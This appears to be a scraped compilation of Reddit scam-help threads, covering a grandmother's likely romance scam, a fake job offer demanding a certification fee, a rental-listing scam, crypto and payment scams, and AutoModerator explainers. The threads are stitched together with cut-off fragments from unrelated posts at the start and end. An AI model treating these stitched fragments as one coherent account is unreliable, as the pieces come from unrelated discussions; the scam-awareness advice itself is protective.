These shady sellers usually sell cheap products that would otherwise not receive positive reviews (or many purchases at all) naturally. You're either asked to pay for it in full on Amazon, and be reimbursed via PayPal (which Amazon famously doesn‚Äôt use) to hide the transaction, or receive a gift card. Here‚Äôs an excellent [article](https://www.buzzfeednews.com/article/nicolenguyen/her-amazon-purchases-are-real-the-reviews-are-fake) describing in-depth how this process works. One should never trust an Amazon (or other merchant's) review - carefully research the products they purchase instead. Of course, there‚Äôs always the chance that an Amazon Review scam is just a scam and they‚Äôll just take your money and run. Credit to user SuwanneeValleyGirl for this script.

Title: How to talk to family member about a dating scam
Body: The only advice I see is how you prevent scams or get your money back after it happens. I need less logic more empathy. 

My grandfather just died, my grandma started emailing a guy we don't know how they started emailing, she won't tell us. But we think he's trying to scam her. He claims he's 14 years younger than her ( my grandfather was 80, my grandma is 70 something so he'd be a little bit older than my mother who my grandma had at 17. Idk their ages exactly cause " its rude to ask women that" ) anyway he also says he lives in New York. And is sending her poems which she thought he wrote himself but we found were written years ago by different names. Could it be a pen name? We don't know. He won't send a picture without his face blocked. And he's flirting with her a lot. 

How do we talk to her about concerns without accidentally pushing her away? We're concerned he wants her money because 1,000 randomly went missing from her bank account. She was able to get the money back.  I think it was from buying something online but my mom thinks it's this email boyfriend.  
My grandfather died in December.  It's only January and this new guy is talking about getting married and claims he's from Finland.

My great aunt her sister fell for a similar scam a " Bank employee " called her after her husband died about an issue that didn't exist then pretended to fall in love with her. It exculated to her losing her house and her perfect credit score ruined. 

When did phone scammers start playing the long game? 


Main question, TLDR: how do I approach my grandma about a potential scammer without pushing her away. Or investigate this guy to see if he's real


Edit: she's highly religious, fallen for cults and scams before, and very stubborn.  If I make the wrong move it will push her closer to this guy. Thank you for the solid definition of this type of scam. I was already awear of scams like this. My question is more so: how do I approach her without scaring her away. Prove to her I'm on her side and have nothing to gain from her not being happy. 

Honestly I WANT her to fall in love again.  Just with a real person. She shouldn't be lonely at the end of her life. She spent 62 years with my grandfather.  And they weren't happy, I wish this guy was real so badly. But I just can't bring myself to accept it. There's too many red flags. And it's moving too fast. How do I communicate my concerns in a way that she'll believe me? Or lead her to come to the conclusion on her own??

Edit 2: I got his discord and a photo. I will NOT be contacting him cause that's unsafe and would cause problem.  My grandma doesn't have discord, but my elder brother does, so HOPEFULLY this is one of his friends from the military and he decided to set them up. But in the off chance that it's not is there a tool to search discord usernames to see if they're associated with a scam? 

Also advise on what language to use so she won't be scared or think I'm overreacting or against them for anterior reasons or whatever he might try to convince her of, they always isolate their targets.

- He's probably not real, sounds like a standard romance scam.

You can do some basic investigation with free tools online; reverse image searches, Googling email addresses/phone numbers, etc. Google whoever wrote the poems he sent her and find out if they're even alive/if there's photos of them.

You could approach your grandma kindly and show interest in her boyfriend, tell her you're happy that she's happy and you want to know more about his background. There's a few common stories: they're in the military deployed to a foreign country, they work on an oil rig, almost always they're somewhere remote. Feign genuine interest and try to learn as much of the story as possible so that you can have an easier time debunking it when the time comes. Tell her you hope he's being nice to her, ask what she likes about him, try to find out if he has any pet names for her ("my queen" is a red flag) and if he's checking on her/asking if she's eaten (another red flag). If they've said "I love you" try and find out how quickly. From what I've seen scammers will profess their love within a couple of weeks.

If you're not super familiar with romance scams, I recommend watching a few episodes of Scamfish by Social Catfish on YouTube. They run a website where you can pay to do reverse image searches and the like and in order to promote it they created a YouTube channel where they investigate people's online romantic partners for free. You don't need to watch a lot of them, once you see two or three you'll realize they're pretty much all the same with some slight variances.

If the info she gives you about her boyfriend seems to line up with the M.O. of a romance scam once you've learned a little more about how they typically work, you can kindly express concern. Obviously it's bad if the $1k that came out of her account is related to this and that would warrant acting more quickly, but if she's lying about that she's likely to lie about more to anyone who comes at her with an angle that makes her feel like a fool. You can share any research you were able to do with her and you can say you saw something about romance scams online and you're worried now because it sounds really similar to what she's describing, maybe watch one of the Social Catfish videos with her so that she can see other people going through the same thing and how much money they've lost. 

Just approach her with kindness, these kinds of scams work because the scammers provide their victims with consistent, albeit generic, attention and praise. And they work on A LOT of people, so make sure she knows you don't think she's an idiot because lots and lots and lots of people fall for this every day. Since you didn't say your grandma's boyfriend is a celebrity I'll go so far as to say lots of people fall for much more obvious scams every day. Talking to romance scammers becomes an addiction for the people who fall prey to them, especially for older people who are lonely, and even more especially if they've recently lost their life partner. Make sure to check in on her frequently, give her a call regularly, tell her you love her - it won't fix it but if she feels love from the people in her life she may be a little less susceptible to sweet nothings from mysterious strangers.

This is too long already, I'll shut up for now, but that's how I'd go about approaching it with empathy. You might need some logic on your side as well once she feels safe enough to admit her bf might not be real to push her over the edge, though, and I can go into that later if necessary.
- AARP and FTC both have great resources for pig butchering. 

However what you need to do is think is to get someone else outside the family that your grandma respects to provide the evidence from these sources. 

At least that will give you a chance.
- So far, you're doing the right things. 

To the extent possible, try to make arrangements with your grandmother to shield her assets. You might say (without reference to the very obvious scammer) that widows in her age group are massively targeted and that scams of all kinds have become so widespread recently that it's a crisis. You could list the other kinds of scams: the fakecheck, jury duty, family member in jail, gift card, and other scams. Tell her that very smart people have gotten caught in these. 

The only way to protect her is for her to let you be a bit more involved in oversight of some of her finances. This could sound like you being shady, so get together some examples of all these scams (plenty on this sub) to show her. Again: not targeting the romance scam guy, but speaking more generally. The stories on this sub are very similar to yours, and many are heartwrenching. 

Steps you can take (if she's willing) might be: putting her main assets in a trust, so that she can't lose her home; being a second name on her credit cards, so that you see her monthly statements and get notified if there are any strange charges; putting a filter on her phone to block unknown calls; and talking to her bank about her vulnerability. 

I believe that AARP also has a fraud help program that may give you tips and resources for talking to her. 

As for the actual romance scam: as you say, logic doesn't work. She's grieving for her husband and she's very lonely. The communications from the guy are filling a need, and she's not going to give up that no matter what the evidence shows. Think of it as a kind of addiction. Also, she probably considers herself too smart to fall for a scam. And people who lean into religious cults are especially vulnerable to this stuff.

TL;DR: you probably can't convince her to give him up. Your best bet is to help her set things up so she doesn't end up homeless and sleeping on your couch, as happened to the father of someone who posted here the other day. Also, you must shield your own assets and talk to your other family members so that no one helps her feed this addiction.  

Lastly, if she belongs to a church, perhaps her pastor can be your ally, unless it's a sleazy church. Pastors must see this scenario frequently among their older parishoners. Since she's religious, she might trust her church more.
- I think this is a classic pig butchering scam. But since I'm from Finland, I find it interesting because he claims to be from Finland. Has he said anything in Finnish to her? 

Finland is a very niche country both with language and culture, and I have a hard time believing a scammer could pull that off with a native Finn.
- !pigbutchering
- Thank you I'll try showing interest.  I have tried reverse searching him but no images come up. And yeah it definitely became an addiction to my great aunt.  She lost her house and everything over it. She has dementia now and still misses the scammer guy and asks to send him money. It's very sad.
 I know I'll need logic too, but most of the logical advice is stuff I knew. I feel I'm lacking in the social skills required to help someone see something is bad on their own.
- He looks like he could be from there but yeah. The closest I know to Finland is denmark. I have a lot of friends there. They know more about Finland than me. So I'm going to ask them questions about his actions once my grandma tells me about him or my mom tells me more information
- Hi /u/AddisonDeWitt333, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

- My comment got removed cos I violated Rule 8, my b, but I'll repost the part that wasn't related to that:

Was your great aunt this grandma's sister? If they were close and she knows the story of what happened to her it might be worth pointing out similarities as they arise. Gently.
- [removed]
- My great aunt is my grandma's sister but she has very serious dementia now.... unfortunately she sometimes still asks if we can check on her scammer or send him money. Sometimes she gets him confused with scams that didn't happen to her. Like " but he's a Nigerian prince!" And I'm just in awe of what blank spots  the brain is capable of filling in... my grandma, so far doesn't have dementia, but if she really is falling for a scammer this might be an early sign. That'll be a different conversation on a different subreddit.  For now I just need to figure out how to talk to her without making her feel stupid. Or guide her to the possibility that this guy might not be who he says he is, without her realizing that's what I'm doing.  It has to be her idea or she won't accept it. Like preventing a family member from joining a cult or MLM

- 1/2

I exceeded the character limit with this comment so I have to break it up. Sorry I talk too much. 

I'm sorry to hear about your great aunt, that's rough. I just meant that if your grandma knows her sister got scammed in that way and then recognizes similarities in their stories it might help her to realize the problem. That may not be enough for her to see the light, but the good news is that she has at least you. It's much harder for victims to recover if they don't have a good support system. If you have other family members who can help that would be ideal.

As far as researching the scammer, I'll give a few suggestions of things I would do:

\-If you have a phone number for him, put it into CashApp and see what name and photo comes up. You have to act like you're starting a transaction to do this, so I would just put in $1 and select "Request" so you don't accidentally send whoever comes up money. Allegedly you can also put a phone number into PayPal after clicking Send or Receive (I would select Receive here too for the same reason) and see if an account comes up/what the name and photo associated with it are - if it's not the name that he gave your gma that's a bad sign

\-Google the phone number with and without spaces in quotation marks and see if anything relevant comes up

\-Put the phone number into Facebook search and see if a profile comes up (this might not work anymore but it used to - you could also try with email but I don't know if that works either anymore)-Google the email address. Sometimes people post email addresses that they've gotten scam emails from on random websites, if someone else has confirmed they were scammed by the same address then it's pretty open and shut (at least for us, it still might take more to convince your grandma). It's also possible that it's a contact email on some website site that he's registered to conduct scams. You can also search PayPal with an email address the same way you can with a phone number as far as I understand.

\-Use [viewdns.info](http://viewdns.info) to run a reverse WhoIs search on the email and see if there's any domains registered to it that might give us more info about what this guy is up to

\-Alternatively, if your grandma tells you that he's trying to get her to do investments/dropshipping/some other get rich quick thing through a website he provides to her do a WhoIs on that domain and see if the registration is public

\-I know you said you already did a reverse image search, but you may want to try another provider. I assume you used Google Images, there's also Tineye and others, I couldn't remember the names of any others so I searched and I can't fully vouch for it but I just found one called [reversely.ai](http://reversely.ai) \- I popped a random photo in to test it and the results weren't bad, but that's my only experience with it. Make sure to search every photo of him you have access to - even if we don't find an exact match it might turn up a known location that doesn't align with the scammer's story or something else potentially valuable. If there's photos of him indoors, check if there's any visible power outlets to identify what region the person in the photos might be located in and compare with the scammer's claims.

edit: fixed formatting things
- Thank you I'll try that one. I tried a few other free ones. Someone who looks like he might be this dudes brother came up but it wanted me to pay to see what url the photo had been posted on. There is a coffee cub, branded to a Cafe, I can't find it with just Google search but maybe someone will recognize it. Its a brown diamond shape. Fancy looking mug. ( not actually a cut stone diamond shape. But more like a square turned on its side 2D diamond shape) I've been searching for that. Tho who knows he could have taken that photo while traveling or there could be similar logos. It's blurry
- That ai generator brought up an author who looks similar to him, except all the photos of him are poor quality from when he looked like the photo sent to my grandma. It's possible the photo was enhanced to make it look newer.  The man it thinks it is has new photos but he is chubby and gray in them. I'm unsure if I'm allowed to post his image here. I want to refrain from doing so until it's confirmed.  I wouldn't want my own reddit post to come up if my grandma decides to look into him on her own. She'd think I was manipulating her or something.

- Mods deleted my comment again, I assume because I suggested a way to possibly find the scammer's location and I guess that falls under scambaiting. I usually think of actively messing with a scammer when I think of scambaiting, but if what I suggested falls under that category because it does technically involve contact with the scammer, I guess they got me. Here's my long ass comment again with that particular suggestion removed. Hopefully everything else is good. They're watching me.

2/2

\-I believe you said you don't have any photos of the bf's face? That's super weird, first off, so I would ask your gma about that and how she's dating someone whose face she's never seen before - but if you do have any face photos, you could sign up for a free trial of PimEyes (pimeyes.com) which uses facial recognition to find other photos of the same person online. It's actually terrifying how good it is, I opted out so my face isn't searchable, which you can also do on their website.

\-I realized I forgot to ask how they met. You said they're communicating via email - did she just reply to a random email she got or did they meet on another platform and then move to email? If they met on another platform, scrutinize the profile she was interacting with and any other social media accounts that he's given her. Check how many friends/followers they have vs. how many they're following. Do a spot check of followers/followees because sometimes the scammers add their personal profile as a friend to these accounts. See if they tag other people in their photos and look into those profiles as well. See if they're tagged in anyone else's photos. See if anyone is engaging with their posts. Basically check to see if their account looks like it belongs to a real person interacting with their real friends and family and determine whether there's engagement from accounts that appear suspicious.

\-Google any handles that he uses. The email address your grandma is communicating without @ domain.whatever would qualify as one handle worth looking into, and if they have any social media profiles that your grandma knows of Google those usernames too to see if any others turn up. If there's a Facebook account for him the username is usually in the URL of their profile. You can also put handles into Cash App and/or Venmo and see who pops up.

\-Google the name he goes by and see if that's a prominent figure that is easily identifiable. I've seen romance scammers pretend to be UN officials and things like that, people who might not be "famous" per se but who will absolutely turn up in a Google search and who will have legitimate social media profiles that can be shown side by side with the scammer's imitations

That's all I've got off the top of my head, I'll probably think of more later but there's some search tips I like to use that might be less obvious.

Disclaimer: I do not work for or receive any compensation for promoting any of the services above, they're all just things that have been useful in my own investigations, which included almost 10 years of private sector fraud and money laundering investigations.

edit: wrong form of "their"

2nd edit: paranoid that the mods are gonna delete for scambaiting again because I mentioned having the gma ask something, deleted that
- He is holding a cup blocking part of his face so it's not a very clear photo for detection or ai. But the quality of the photo otherwise is good. About iPhone quality.  Or Samsung before being uploaded to an Apple bias app. I'll look into these tools mode thank you. 

I'm mostly worried about how to convince her if I do find proof. 

I see all these videos of these old ladies being scammed and I know how stubborn my grandma is.  They're always like " everyone told me it was a scammer but I knew he loved me. I feel so stupid. " but my grandma wouldn't be able to accept being wrong like that if we tell her directly.  We can and will warn her and show her red flags. But I need to figure out how to approach this gently and in a way where she won't detect me fear or concern.... you know,  make her think she came to the conclusion alone. And that she's smart for doing so. She is smart, smarter than most old women. But scammers pray on that too, you can't play mind games with a brick wall.

- Why would a job send you an offer letter if you never applied to them?

!job scam of some type, possibly a !task scam too
- I also got offer letter
- Is it true or not?
- me also got, they asked cjdp license because of non-us citizen for this we have to pay $9, so it is fake or not
- Fake. You can't get a professional certification such as CPDA by paying money only. All real certifications require education, professional study, a lengthy exam, and prior experience in the field.  Do a Google search for the Certified Professional Data Analyst (CPDA) certification.

The job is a scam, as others have said. No real company hires this way, messaging people randomly.
- Tinsley IT Solutions LLC appears to be a real company. They have a website, with a listing of job openings.

However, the communicatios you got may be from someone impersonating the company.

Please give more info:

How did they contact you? What is the email domain?

How did they interview? Phone, email, text, video, in-person?

What is the job title? What are the responsibilities?

Is this job in the office, remote / work from home, or hybrid? If it is remote or hybrid, how will they help you set up your home office?
- I got an email a month ago for a Python developer and have given aptitude and programming tests.

  
The Python programming has one particular question with the Javatpoint name, So most probably, the question was taken from Javatpoint or from other websites. Additionally, the Tinsley IT Solutions website was registered a month ago, and I got another email for "onboarding formalities."

Now, they want me to take the CPDA-25 exam, which costs 9 USD. 

Now the most FUNNY part of the website: Tinsley IT Solutions, TechCertLabs and DocsAuditX is registered in the city  Reykjavik, Iceland. 

  
here are whois search for all three websites:

1. [https://www.whois.com/whois/tinsleyitsolutions.com](https://www.whois.com/whois/tinsleyitsolutions.com)

2. [https://www.whois.com/whois/techcertlabs.com](https://www.whois.com/whois/techcertlabs.com)

3. [https://www.whois.com/whois/docsauditx.com](https://www.whois.com/whois/docsauditx.com)

  
I can only think they want money which is paid for certifications and if you give any documents then don't worry They are doing for formalities and to make it legit.

The only solution which I think is best is just simply blocking all Newly Registered Domains(NRDs)
- Dawn Tinsley? Of the Office?
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- I also got same offer later, what can I do
- Almost certainly a scam.
- Of course it's fake.
- I also got the same offer letter and they ask me for CPDA certificate ,so is it Fake ?
- You can't get a professional certification such as CPDA by paying money only. All real certifications require education, professional study, a lengthy exam, and prior experience in the field.  Do a Google search for the Certified Professional Data Analyst (CPDA) certification.

- Do you use unique passwords everywhere, or do you use the same password multiple places?
- It was through tik Tok verificationüíÄ
Basically they told me that the code was for something and I was still half awake and I sent it to them then they logged in and I was able to change my password and kick them off.
The story sounds so stupid but I don't even usually fall for scamsüò≠

Title: Almost Caught in a Rental Scam ‚Äì Our Eye-Opening Experience
Body: I wanted to share a recent experience my fianc√©e and I had while house hunting.

We were excitedly checking out potential rental homes and had set up a viewing for a promising property. When we arrived, the supposed "agent" was oddly slow to respond to our texts. They eventually implied it was an open house, which seemed plausible since I'd toured homes without an agent before. We asked if we could see the inside, and their response was simply, "Walk in." But when we tried the door, it was locked.

That's when we spotted a sticker on the door: "This home is not for rent ‚Äì report the scam." It hit us like a ton of bricks. The scammers were counting on the door being unlocked, a gamble that likely pays off often enough in open houses.

I should have known but relied on my fianc√©e to do the vetting. The house was priced lower than usual but not absurdly so, just enough to raise subtle suspicion. The texts were exceptionally brief and came from an out-of-state area code ‚Äì another red flag.

Curious, we Googled the address and discovered the property was actually for sale on Zillow, not for rent. Yikes! By then, we realized they would have probably asked for some odd form of payment, like gift cards, with promises of a "better deal."

Fortunately, we only lost about 30 minutes of our time, but it was a wake-up call. Always verify listings independently, and if something feels off, trust those instincts. I hope this story helps someone avoid a similar situation!

Stay safe out there and always do your due diligence!

- Well done by the owners of the house.
- In the mid 70's an acquaintance of mine rented an apartment.  Met the landlord at the apartment, viewed it, signed the lease, paid first month and security, gets the keys.  A week later shows up with his rental truck full of his stuff to move in.. and four or five other people showed up to move in.
- Happened to my parents last year, my mom found this listing when looking for a home to rent that seemed somewhat legit, price was really good for the area and fit our criteria. The ‚Äúowner‚Äù said he had moved out of state but wanted to still rent his house, which is fairly common for California. My mom filled out the application he had, but the ‚Äúowner‚Äù kept pushing off letting us tour the home. Eventually my mom decided to just go over there herself to look at the street and the area.¬†

When she walked up to the home though, she realized people were already living there. Turns out the ‚Äúowner‚Äù had simply re made an old rental listing to bait people into giving up confidential info. My mom had to freeze all her accounts until she was sure nothing happened.
- Where was the property listed for rent?
- Yes, a woman came to my house one day; she‚Äôd already paid an application fee. I didn‚Äôt know anything about it and I had to give her the sad news she‚Äôd been scammed. üò¢
- Something similar happened to me and my ex years ago! Originally I saw the house for rent on one of the typical rent sites and we asked if we could tour it. The person said ‚Äúsure but I had an emergency and I‚Äôm out of town for 2 weeks but you can drive by and look at it‚Äù and gave us the address. Hmmm, okay? 
We expected it to be an empty house and were gonna peek in the window to see how big it actually was so we went up to the door and knocked and someone answered the door. We said we saw their house was for rent online and the guy said ‚Äúumm no, it‚Äôs for sale tho.. where online did you see it?‚Äù We showed him the posting and told him about the back and forth we had with the scammer. He was thankful we let him know and we all reported it. I‚Äôm hoping he ended up doing something similar to the place OP went to in case he wasn‚Äôt home if someone else were to come look at it.
- When I have looked for rentals, I always double check if the property is for sale (Zillow,Realtor). I‚Äôve contacted the realtor if it is listed for sale to either check if it‚Äôs available as a rental or as a heads-up that it‚Äôs listed for rent somewhere. That‚Äôs probably what happened with this home, thus the sticker.
- Imagine if a real landlord just let randos he'd never met wander through your house without supervision.
- It's so frustrating how common these scams are these days, and they're getting smarter about it. I'm on the market for a rental and have encountered this same thing 3 times in the past 2 months. 

The first 2 were pretty blatant scams. "Self-guided" tour followed by asking for a deposit even before any paperwork was exchanged. I was also able to find that both of those properties were up for sale on popular listing sites. The last one nearly got me, and it was a similar situation to the one listed by OP. The price was reasonable, just slightly cheaper than similar properties. There was a key code on the door, which the "landlord" provided, so it still seemed legit. Having been burned on the previous 2, I looked online and couldn't find the property listed for sale anywhere, but did find it for rent on other sites at the same price, so everything was still feeling OK. I began discussions with the landlord, he sent me some legitimate looking paperwork, and I asked if I could do a second walk through to plan my layout, which he agreed.

Something still felt off. The first red flag was the neighborhood. It was slightly more upscale, so the cheaper price made me curious. I also noticed the yard wasn't being maintained, something that most landlords want to keep up on during this process for the curb appeal. I was parked in the driveway taking pictures when the neighbor approached me, and that's when it all fell apart. He asked if the person I was talking to was an individual or a company, and notified me that a company had bought it a few years ago and I was probably being scammed. He asked what they were asking for rent, and he told me they wanted almost double that amount. He also offered me the previous tenant's contact information, and said that he had moved out because the company refused to make any repairs, including a bad mold problem (which I had noticed during the first walk through and was informed it "would be taken care of before move in"). His information was more than enough for me to walk away.

Stay vigilant folks.
- Worse, they probably would have asked for a deposit and possible 1st month rent and taken your banking and credit info for a credit check to steal your identities. Good save!
- Good on OP for checking it out! 
I‚Äôm in Real Estate and anytime we list a vacant house- we put a notice on the door. 
The number of folks that I‚Äôve talked to over the years that have sent THOUSANDS of dollars to scammers- while they were just trying to get a safe place to live is heartbreaking! 
So little can be done- you can report the scammers- but they use bs numbers, emails & accounts so there is no way to track them- that money is GONE! 
They will often pull tax records and use the actual owners name to try and sound legit. So you can‚Äôt always trust that. 

I had one situation where the owner passed and we were helping the family sell. A poor renter called me demanding to talk to the deceased owner they thought they were communicating with - even after I sent the obituary‚Ä¶ they claimed I was in on it and the real scammer‚Ä¶
- I'm not sure it helps, but I post in my rental listings to not send cash to anyone without viewing the property with me first.
- Common !rental scam.
- [removed]
- Something similar happened to my husband and I when we were first looking for an apartment in the first year of our marriage. We had just graduated from college so had never rented an apartment before, had only lived in college housing. This was in 2010, in Boston. 

I found a listing for a very nice but modest apartment in a nice building in one of our preferred neighborhoods. Also Craigslist. The owner of the unit was ‚Äúout of the country on business‚Äù but would of course be delighted to take all our money and leave a key for us once everything cleared.  But we couldn‚Äôt go see it because he was out of the country. 

We did a little digging and wouldn‚Äôt you know, that apartment was actually a condo for sale on a very different real estate website. The guy we were talking about was a total scammer. I‚Äôm glad you managed to avoid this!
- Realtors need to start warning home sellers to do this.
- My parents almost got got in the 80s. But the "landlords" behavior was suspicious enough my dad went to the courthouse to look up the records¬†and call the actual owner who confirmed it was tenants running a scam. At least its way easier to investigate such things these days!
- Oh my bad. It was on Craigslist. Another red flag I forgot to mention.
- Riverside County in California
- During Covid it was standard practice. I had to move February or 2020. I toured several homes solo with a leasing agent over a phone call. The place I eventually leased I didn‚Äôt even have the opportunity to see it in person and just over a video call. In those situations I did my homework though and worked with major real estate agents or huge leasing companies with great reviews. Nowadays I would never even consider signing a lease without viewing it first in person and with an agent.
- Hi /u/idkhereforrealinfo, AutoModerator has been summoned to explain the Rental scam.

Rental scammers usually list apartments at lower than market rate, and will ask for some money up front, or will offer you the keys for money up front. The scammer has no property to rent, and any money you send to the scammer will be lost.

Always tour the place in person with the landlord, property manager or realtor. Never alone, never with an access code, never virtually. Only send deposits and application fees after touring the place, and get a proper receipt for it. Anyone trying to collect money from you without meeting you is a scammer or a shit landlord.

Verify the identity of whoever is touring the place for you. It's always good to check with neighbors to see if the person you're dealing with is legit, or if there's a story behind it. You may learn that this is actually an Airbnb and that a scammer got an access code for it. You may find out the real owner/renter is away on vacation. And if it's a sublet, be informed about it and check with the original landlord to see if it's allowed.

Never sign contracts, or pay deposits, or even application fees/reservation fees without meeting in person first. Never ever send a photo ID or anything not considered public information. Nobody should ask you to pay to reserve your spot without meeting face to face.

- A better approach would be to stop taking investment advice from randos on Telegram and WhatsApp.
- The entire thing is a huge scam and you're going to just get scammed again if you don't realize that. These are not legitimate investment platforms for long term stability and growth
- All these names are not important. Just stay away from !crypto altogether. Otherwise you WILL keep getting scammed.
- **No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to take more of your money.

As others have said, the money is gone. You didn't  invest money, you gave it to the scammers.  **There is no investing site or app, that's all phony.** There is no profit. Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money.
- Always replace ‚Äútelegram rando‚Äù with ‚Äúbum outside the bodega‚Äù in the story and ask yourself if you‚Äôd still think it‚Äôs legit.
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

I started talking to her on whatsapp and she said if you give me an extra ¬£50 through bank transaction I will send you custom videos and photos. So I thought about it and decided to do it.
I sent the ¬£50 to her and within a few hours she blocked me on whatsapp and on SC. It was a scam and I fell for it like an idiot.

Is there anyway I can get my money back?

- Nope. Your money is gone forever. You chose to send it of your own free will, and it's your fault/responsibility not your bank/cash app. Don't trust strangers with your money or reputation. 

There's so much free porn out there, no idea why you needed to pay for it, but there's also legitimate platforms that have protections for their customers like onlyfans (and always stay on platform) if you really need to spend money for that kind of thrill.

Beware of !recovery scammers.
- No, and maybe.

Seriously, do not fall for !recovery scammers who most likely will contact you now.
- If SC is Snapchat then don‚Äôt bother. They don‚Äôt care. What would help you most is to delete it, TikTok and your other social media accounts.
- Unfortunately, your money is gone, and reporting it won‚Äôt get it back. Be careful, though‚Äîscammers often target people again with ‚Äúrecovery scams‚Äù pretending they can help you get it back.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

Title: Is this a scam? Buyer has a Zelle business account
